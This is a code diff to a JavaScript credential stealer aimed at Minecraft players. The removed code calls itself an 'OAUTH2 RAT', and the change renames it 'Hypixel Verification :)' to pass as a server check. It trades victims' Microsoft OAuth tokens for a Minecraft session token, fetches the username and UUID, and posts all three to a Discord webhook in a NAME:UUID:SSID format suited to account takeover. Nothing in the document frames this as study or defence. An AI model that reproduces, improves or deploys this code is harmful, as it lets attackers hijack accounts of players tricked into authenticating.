@@ -21,10 +21,11 @@ app.get('/', async (req, res) => {
         const userToken = hashAndTokenArray[0]
         const userHash = hashAndTokenArray[1]
         const xstsToken = await getXSTSToken(userToken)
-        const bearerAndUsernameArray = await getBearerTokenAndUsername(xstsToken, userHash)
-        const bearerToken = bearerAndUsernameArray[0]
-        const username = bearerAndUsernameArray[1]
-        postToWebhook(username, bearerToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        postToWebhook(username, bearerToken, uuid)
     } catch (e) {
         console.log(e)
     }
@@ -88,7 +89,7 @@ async function getXSTSToken(userToken) {
     return response.data['Token']
 }
 
-async function getBearerTokenAndUsername(xstsToken, userHash) {
+async function getBearerToken(xstsToken, userHash) {
     const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
     const config = {
         headers: {
@@ -99,21 +100,33 @@ async function getBearerTokenAndUsername(xstsToken, userHash) {
         identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
     }
     let response = await axios.post(url, data, config)
-    return [response.data['access_token'], response.data['username']]
+    return response.data['access_token']
 }
 
-function postToWebhook(username, bearerToken) {
+async function getUsernameAndUUID(bearerToken) {
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
+    const config = {
+        headers: {
+            'Authorization': 'Bearer ' + bearerToken,
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['id'], response.data['name']]
+}
+function postToWebhook(username, bearerToken, uuid) {
     const url = webhook_url
     let data = {
-        username: "Normi's OAUTH2 RAT",
+        username: "Hypixel Verification :)",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "||@everyone||",
+        content: "@everyone",
         embeds: [{
             title: "User Info", color: 0x00ff00, fields: [
-                {name: "UUID", value: username},
-                {name: "Bearer Token (SessionID)", value: bearerToken},
+                {name: "Username", value: username, inline: true},
+                {name: "UUID", value: uuid, inline: true},
+                {name: "SessionID", value: bearerToken, inline: true},
+                {name: "NAME:UUID:SSID", value: username + ":" + uuid + ":" + bearerToken, inline: false}
             ]
         }]
     }
-    axios.post(url, data).then(r => console.log("Successfully authenticated, posting to webhook!"))
+    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
